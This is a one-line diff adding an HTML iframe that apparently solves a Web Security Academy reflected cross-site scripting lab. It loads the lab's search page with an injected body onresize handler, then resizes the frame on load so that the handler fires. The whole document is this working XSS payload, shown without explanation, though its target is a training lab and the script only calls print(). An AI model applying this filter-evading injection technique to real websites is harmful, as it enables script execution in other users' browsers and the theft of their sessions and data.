@@ -1,0 +1,1 @@
+<iframe src="https://0a6e00ae04c1778d80d43f03004f008f.web-security-academy.net/?search=<body%20onresize='print()'>" onload="this.style.width='100px'"></iframe> 
